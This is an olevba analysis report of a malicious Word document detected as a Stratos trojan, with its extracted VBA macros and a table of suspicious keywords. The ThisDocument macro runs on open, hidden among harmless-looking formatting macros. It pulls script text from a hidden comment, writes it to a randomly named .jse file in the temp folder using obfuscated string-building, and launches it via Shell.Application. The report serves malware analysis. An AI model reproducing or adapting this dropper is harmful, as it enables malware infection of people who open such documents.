olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Stratos.gen-cfab9c0243d9f63092962f133f7f82bc740cba57e74a155cbc453c46b3d19884
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function showF() As String
 Randomize
 Dim someSymb As Integer
 someSymb = 92
showF = Environ(Mid("dfsgsrTEsrdgrg", 7, 2) & Mid("bnxtrh4MPnxgdfhse", 8, 2)) & Chr(someSymb) & Rnd & ".jse"
End Function
Sub PutNamesInHeader()
    Dim sName As String

    Open "c:/names.txt" For Input As #5
    Do While Not EOF(5)
        ' get the name
        Line Input #5, sName

        ActiveWindow.ActivePane.View.SeekView = _
          wdSeekCurrentPageHeader
        Selection.WholeStory
        Selection.Delete
        Selection.TypeText Text:=sName

        ActiveWindow.ActivePane.View.SeekView = _
          wdSeekMainDocument
        ActiveDocument.PrintOut
    Loop

    Close #5

    ActiveWindow.ActivePane.View.SeekView = _
      wdSeekCurrentPageHeader
    Selection.WholeStory
    Selection.Delete
    ActiveWindow.ActivePane.View.SeekView = _
      wdSeekMainDocument
End Sub
Function whtDo() As String
whtDo = "Shell.Application"
End Function
Sub QuotesToItalic()
    Dim Redo As Boolean
    Dim Ptr As Integer
    Dim Ptr1 As Integer
    Dim P As String
    Dim P1 As String

    If Selection.ExtendMode Then Exit Sub
    Redo = True
    While Redo
        Selection.StartOf Unit:=wdParagraph, Extend:=wdMove
        Selection.MoveEnd Unit:=wdParagraph
        P = Selection.Text
        Ptr = InStr(P, Chr(34))
        If Ptr = 0 Then Ptr = InStr(P, Chr(147))
        If Ptr > 0 Then
            Selection.MoveLeft Unit:=wdCharacter, Extend:=wdMove
            Selection.MoveRight Unit:=wdCharacter, Count:=Ptr
            Selection.MoveEnd Unit:=wdParagraph
            P1 = Selection.Text
            Ptr1 = InStr(P1, Chr(34))
            If Ptr1 = 0 Then
                Ptr1 = InStr(P1, Chr(148))
                EndChar = Chr(148)
            Else
                EndChar = Chr(34)
            End If
            If Ptr1 > 0 Then
                Selection.MoveLeft Unit:=wdCharacter, Count:=2, _
                  Extend:=wdMove
                Selection.Delete Unit:=wdCharacter
                Selection.MoveRight Unit:=wdCharacter, _
                  Count:=Ptr1 - 1, Extend:=wdExtend
                Selection.Font.Italic = True
                Selection.MoveRight Unit:=wdCharacter, Extend:=wdMove
                Selection.Delete Unit:=wdCharacter
            Else
                Selection.MoveRight Unit:=wdCharacter, Extend:=wdMove
                Redo = 0
            End If
        Else
            Selection.MoveRight Unit:=wdCharacter, Extend:=wdMove
            Redo = 0
        End If
    Wend
End Sub
Function thinhS() As String
 Dim igotThis As Range
 Set igotThis = ActiveDocument.Comments(1).Range
 igotThis.TextRetrievalMode.IncludeHiddenText = True
 thinhS = igotThis.Text
End Function
Private Sub Document_Open()
 Dim whatSearch As String
 whatSearch = thinhS
 
 SearchPath = showF

 Set fs = CreateObject("Scripting.FileSystemObject")

 Set teta = fs.CreateTextFile(SearchPath, True)
 teta.Write (whatSearch)
 teta.Close
    
 Set objShellApp = CreateObject(whtDo)
 objShellApp.Open (SearchPath)
End Sub
Sub FindFigs()
    Dim varItem As Variable
    Dim bExists As Boolean
    Dim iShapeCount As Integer
    Dim iJumpTo As Integer

    ' ensure variable exists
    bExists = False
    For Each varItem In ActiveDocument.Variables
        If varItem.Name = "FigNum" Then
            bExists = True
            Exit For
        End If
    Next varItem

    ' initialize document variable if doesn't exist
    If Not bExists Then
        ActiveDocument.Variables.Add _
          Name:="FigNum", Value:=0
    End If

    ' figure to jump to
    iJumpTo = ActiveDocument.Variables("FigNum") + 1

    ' get number of shapes
    iShapeCount = ActiveDocument.Shapes.Count
    If iJumpTo > iShapeCount Then iJumpTo = 1

    If iShapeCount > 0 Then
        'Display the shape
        ActiveDocument.Shapes(iJumpTo).Anchor.Select
        'Select the shape
        ActiveDocument.Shapes(iJumpTo).Select
    End If
    'Set the variable for next time
    ActiveDocument.Variables("FigNum") = iJumpTo
End Sub

-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub q()


End Sub


Sub PrintAllDocuments()
    ' Step through the open document windows
    For Each Doc In Documents
        Doc.PrintOut
    Next Doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Shell.Application   |May run an application (if combined with     |
|          |                    |CreateObject)                                |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
+----------+--------------------+---------------------------------------------+

